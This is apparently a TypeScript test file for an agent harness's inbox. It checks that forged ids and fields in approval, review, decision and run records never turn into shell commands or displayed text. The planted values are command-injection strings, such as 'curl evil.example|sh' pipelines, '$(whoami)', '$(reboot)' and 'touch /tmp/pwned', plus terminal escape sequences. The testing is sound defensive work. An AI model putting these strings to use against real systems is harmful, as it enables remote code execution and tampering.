/**
 * Ids and names a harness's own files carry reach an item only when they fit the grammar
 * their minter gives: a request whose id the store would never mint, a review entry whose
 * id the queue would never mint, and a decision whose kind or action is outside its
 * closed list become no item, no command and no key. Every command an item offers is
 * built from a closed template, each value checked and quoted; a value that does not fit
 * gives no command and says why.
 */
import { afterEach, describe, expect, test } from "bun:test";
import { appendFileSync, mkdirSync, readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { mintId, mintRunId } from "@crewhaus/control-contract";
import { type Ledger, append, decisionsLedger, runsLedger } from "@crewhaus/control-records";
import {
  DAY,
  HOUR,
  MIN,
  NOW,
  failure,
  harnessDir,
  iso,
  park,
  proposal,
  review,
  run,
  tempRoot,
  testFacts,
} from "./__test__/fleet";
import { decisionFactOf } from "./adapters/decisions";
import { REVIEW_ENTRY_ID_RE } from "./adapters/review";
import { assembleInbox, foldHarness } from "./fold";
import { KEY_SHAPE_RE, attIdOf } from "./ids";
import { twinOf } from "./items";
import { metricsOf } from "./metrics";
import { sentenceOf } from "./sentences";

const HRN = "hrn_0123456789abcdef";
const ESC = "\u001b";

/** What a planted value carries: a command separator, a substitution and an escape. */
const PLANTS = [";", "$(", "`", ESC, "|sh"];

const cleanups: Array<() => void> = [];
afterEach(() => {
  for (const c of cleanups.splice(0)) c();
});

function root(): string {
  const t = tempRoot();
  cleanups.push(t.cleanup);
  return t.root;
}

/** Append a copy of a file's last line with some fields replaced. */
function plantLike(file: string, over: Record<string, unknown>): void {
  const lines = readFileSync(file, "utf8").trim().split("\n");
  const last = JSON.parse(lines[lines.length - 1] as string) as Record<string, unknown>;
  appendFileSync(file, `${JSON.stringify({ ...last, ...over })}\n`);
}

/** Append a row to a ledger's newest segment as an agent's own write would. */
function appendLine(ledger: Ledger, row: Record<string, unknown>): void {
  if (!("dir" in ledger.records)) throw new TypeError("a segmented ledger");
  const dir = join(ledger.root, ledger.records.dir);
  mkdirSync(dir, { recursive: true });
  const names = readdirSync(dir)
    .filter((name) => name.endsWith(".jsonl"))
    .sort();
  const file = names[names.length - 1] ?? "000000000001.jsonl";
  appendFileSync(join(dir, file), `${JSON.stringify(row)}\n`);
}

function everyString(value: unknown, out: string[] = []): string[] {
  if (typeof value === "string") out.push(value);
  else if (Array.isArray(value)) for (const v of value) everyString(v, out);
  else if (value !== null && typeof value === "object") {
    for (const [k, v] of Object.entries(value)) {
      out.push(k);
      everyString(v, out);
    }
  }
  return out;
}

describe("planted ids", () => {
  test("a request, a review entry and a delegation request with forged ids become nothing a shell runs", async () => {
    const dir = harnessDir(root(), "planted");
    const real = await park(dir, { tool: "Bash" });
    const approvals = join(dir, ".crewhaus", "sessions", "approvals.jsonl");
    plantLike(approvals, { id: "appr_0123456789abcdef;curl${IFS}evil.example|sh;#" });
    plantLike(approvals, { id: `appr_$(whoami)${ESC}[2J` });
    plantLike(approvals, { id: `appr_${"1".repeat(16)}`, askDigest: "x;$(id)" });
    const realReview = review(dir);
    const queue = join(dir, ".crewhaus", "review", "queue.jsonl");
    plantLike(queue, { id: "x; touch /tmp/pwned-$(id -u)" });
    plantLike(queue, { id: "rev_abstained_x`curl evil.example|sh`" });
    plantLike(queue, { id: `rev_abstained_${ESC}]0;title` });
    const delegation = proposal(dir, { delegate: "merge" });
    const forged = mintId("dec", { now: NOW - HOUR });
    const written = append(decisionsLedger(dir), {
      id: forged,
      kind: "standing-rule-proposal",
      state: "pending",
      createdAt: iso(NOW - HOUR),
      expiresAt: iso(NOW + DAY),
      requiredClass: "owner",
      ifUnanswered: "$(reboot)",
      terms: { ruleKind: "delegate", action: "merge $(curl -s evil.example|sh)" },
    });
    expect(written.ok).toBe(true);

    const harness = foldHarness(dir, testFacts(), NOW, { harness: HRN, content: true });
    const inbox = assembleInbox([harness], NOW, { state: "all" });
    const items = inbox.all;
    // The real request, the real entry, the real delegation request and the forged one.
    expect(items.map((i) => i.source.id).sort()).toEqual(
      [real, `appr_${"1".repeat(16)}`, realReview, delegation, forged].sort(),
    );
    for (const text of everyString(items)) {
      for (const plant of PLANTS) expect(`${plant}:${text.includes(plant)}`).toBe(`${plant}:false`);
    }
    // A digest outside its grammar is left out: the request is its own item.
    const second = items.find((i) => i.source.id === `appr_${"1".repeat(16)}`);
    expect(second?.asks).toBeUndefined();
    // The forged action names no command, and says why.
    const forgedItem = items.find((i) => i.source.id === forged);
    expect(forgedItem?.title.params["delegationAction"]).toBeUndefined();
    expect(sentenceOf(forgedItem?.title ?? { template: "" })).toBe(
      "Letting it act on its own is proposed",
    );
    expect(forgedItem?.ifUnanswered).toBeUndefined();
    expect(forgedItem?.choices).toEqual([
      {
        id: "review",
        needs: "owner",
        cliTwin: null,
        nullReason: "This request names no action a rule may cover, so nothing can preview it.",
      },
    ]);
    const realDelegation = items.find((i) => i.source.id === delegation);
    expect(realDelegation?.choices[0]?.cliTwin).toBe(
      `crewhaus delegations preview merge --harness ${HRN}`,
    );

    // The key walk holds over what is left.
    let walked = 0;
    for (const item of items) {
      const key = [`dec:${item.source.id}`, `rev:${item.source.id}`, `appr:${item.source.id}`].find(
        (k) => `home/attention/${attIdOf(HRN, item.kind, k)}` === item.ref,
      );
      expect(key).toBeDefined();
      expect(KEY_SHAPE_RE.test(key as string)).toBe(true);
      walked++;
    }
    expect(walked).toBe(5);
  });

  test("a reader without content access sees only closed values", async () => {
    const dir = harnessDir(root(), "closed");
    const at = NOW - 10 * MIN;
    const tool = "Bash; echo a-planted-tool";
    const via = "run crewhaus doctor --fix";
    const kind = "refund-jane-example";
    const when = `${iso(NOW + HOUR)} (call jane first)`;
    await park(dir, { at });
    const approvals = join(dir, ".crewhaus", "sessions", "approvals.jsonl");
    // A decided record with a door no list holds, a waiting one with a tool name, a run id
    // and a deadline no minter gives, and one whose creation time is not a time.
    plantLike(approvals, {
      id: `appr_${"2".repeat(16)}`,
      decision: "grant",
      decidedAt: iso(NOW - MIN),
      decidedVia: via,
      resolvedBy: "jane example",
      sensitivity: "jane example",
    });
    plantLike(approvals, {
      id: `appr_${"3".repeat(16)}`,
      toolName: tool,
      runId: "run_jane example",
      expiresAt: when,
      decidedAt: undefined,
      sensitivity: "jane example",
    });
    plantLike(approvals, { id: `appr_${"4".repeat(16)}`, createdAt: when });
    const ledger = decisionsLedger(dir);
    const planted = mintId("dec", { now: NOW - HOUR });
    const decided = mintId("dec", { now: NOW - HOUR });
    for (const row of [
      { id: planted, kind, state: "pending", createdAt: iso(NOW - HOUR), expiresAt: when },
      { id: decided, kind, state: "pending", createdAt: iso(NOW - HOUR) },
    ]) {
      expect(append(ledger, row).ok).toBe(true);
    }
    expect(
      append(ledger, {
        id: decided,
        kind,
        state: "granted",
        createdAt: iso(NOW - HOUR),
        decision: "grant",
        decidedAt: iso(NOW - MIN),
        decidedVia: via,
        resolvedBy: "jane example",
      }).ok,
    ).toBe(true);

    const harness = foldHarness(dir, testFacts(), NOW, { harness: HRN, content: false });
    const items = assembleInbox([harness], NOW, { state: "all" }).all;
    const metrics = metricsOf(
      { items, decisions: harness.decisions },
      { since: NOW - DAY, now: NOW },
    );
    // The records are listed (but the one with no creation time): only their words are not.
    expect(items.map((i) => i.source.id).sort()).toEqual(
      [...items.filter((i) => i.source.kind === "approval").map((i) => i.source.id)]
        .concat([planted, decided])
        .sort(),
    );
    expect(items.filter((i) => i.source.kind === "approval").length).toBe(3);
    const served = JSON.stringify(items) + JSON.stringify(metrics);
    for (const plant of ["doctor", "refund", "jane", "planted", "call", "echo"]) {
      expect(`${plant}:${served.includes(plant)}`).toBe(`${plant}:false`);
    }
    const granted = items.find((i) => i.source.id === `appr_${"2".repeat(16)}`);
    expect(granted?.resolution?.via).toBe("unknown");
    expect(metrics.resolutionByVia.map((row) => row.decidedVia)).toEqual(["unknown"]);
    const waiting = items.find((i) => i.source.id === `appr_${"3".repeat(16)}`);
    expect(waiting?.evidence.map((e) => e.label)).toEqual(["tool"]);
    expect(sentenceOf(waiting?.title ?? { template: "" })).toBe("Permission to use a tool");
    expect(waiting?.affected.runs).toEqual([]);
    const pending = items.find((i) => i.source.id === planted);
    expect(pending?.title).toEqual({
      template: "decision.pending",
      params: { decisionKind: "other" },
    });
    expect(sentenceOf(pending?.title ?? { template: "" })).toBe("A decision is waiting");
    expect(pending?.deadline).toBeUndefined();
  });

  test("a run row that is not one its ledger mints reaches no item", () => {
    const dir = harnessDir(root(), "runs");
    const forged = `run_x; curl evil|sh \`${ESC}]52;c;aGk=\`$(id)`;
    const ledger = runsLedger(dir);
    const real = run(dir, { at: NOW - HOUR, state: "failed", failureClass: "tool_error" });
    const badClass = mintRunId({ now: NOW - HOUR });
    const badTime = mintRunId({ now: NOW - HOUR });
    const trigger = { kind: "api" };
    for (const row of [
      { id: forged, state: "running", at: iso(NOW - HOUR), trigger },
      { id: forged, state: "failed", at: iso(NOW - HOUR), trigger, failureClass: "tool_error" },
      { id: badClass, state: "running", at: iso(NOW - HOUR), trigger },
      {
        id: badClass,
        state: "failed",
        at: iso(NOW - HOUR),
        trigger,
        failureClass: "curl evil|sh",
        specHash: "jane;example",
      },
      { id: badTime, state: "running", at: iso(NOW - HOUR), trigger },
    ]) {
      appendLine(ledger, row);
    }
    appendLine(ledger, {
      id: badTime,
      state: "failed",
      at: `${iso(NOW - HOUR)} (call jane first)`,
      trigger,
      failureClass: "tool_error",
    });
    // A session log's failure class is held to the same words.
    failure(dir, `sess_${"c".repeat(16)}`, "jane;example", "boom", NOW - HOUR);

    for (const content of [false, true]) {
      const harness = foldHarness(dir, testFacts(), NOW, { harness: HRN, content });
      const items = assembleInbox([harness], NOW, { state: "all" }).all;
      const named = items.flatMap((i) => i.affected.runs);
      expect(named.sort()).toEqual([real, badClass].sort());
      for (const text of [...everyString(items), ...everyString(harness.groups)]) {
        for (const plant of [...PLANTS, "jane", "evil", "curl", "call"]) {
          expect(`${plant}:${text.includes(plant)}`).toBe(`${plant}:false`);
        }
      }
      const unknown = items.find((i) => i.affected.runs.includes(badClass));
      expect(unknown?.cause?.label).toBe("unknown");
    }
  });

  test("a review id fits only the queue's own grammar", () => {
    expect(REVIEW_ENTRY_ID_RE.test("rev_abstained_run_00000000000000aa_s1")).toBe(true);
    expect(REVIEW_ENTRY_ID_RE.test("rev_rater_disagreement_sess_aaaa_t1")).toBe(true);
    expect(REVIEW_ENTRY_ID_RE.test("rev_abstained_x;id")).toBe(false);
    expect(REVIEW_ENTRY_ID_RE.test("rev_nonsense_x")).toBe(false);
    expect(REVIEW_ENTRY_ID_RE.test("x")).toBe(false);
  });

  test("a decision's kind, action and fallback outside their lists are left out", () => {
    const base = { id: mintId("dec", { now: NOW }), state: "pending", createdAt: iso(NOW) };
    expect(decisionFactOf({ ...base, kind: "merge;rm" })).toBeUndefined();
    const fact = decisionFactOf({
      ...base,
      kind: "standing-rule-proposal",
      ifUnanswered: "deny;x",
      terms: { ruleKind: "delegate;x", action: "merge" },
    });
    expect(fact?.ifUnanswered).toBeUndefined();
    expect(fact?.ruleKind).toBeUndefined();
    expect(fact?.delegationAction).toBeUndefined();
  });

  test("a command is built only from values that fit their placeholders, each word quoted", () => {
    const tpl = { argv: ["approvals", "{choice}", "{appr}", "--dir", "{dir}"] } as const;
    expect(twinOf(tpl, { choice: "grant", appr: "appr_0123456789abcdef", dir: "/h/my bot" })).toBe(
      "crewhaus approvals grant appr_0123456789abcdef --dir '/h/my bot'",
    );
    expect(twinOf(tpl, { choice: "grant", appr: "appr_$(whoami)", dir: "/h" })).toBeUndefined();
    expect(twinOf(tpl, { choice: "grant;id", appr: "appr_0123456789abcdef", dir: "/h" })).toBe(
      undefined,
    );
    expect(
      twinOf(tpl, { choice: "deny", appr: "appr_0123456789abcdef", dir: `/h/${ESC}x` }),
    ).toBeUndefined();
  });
});
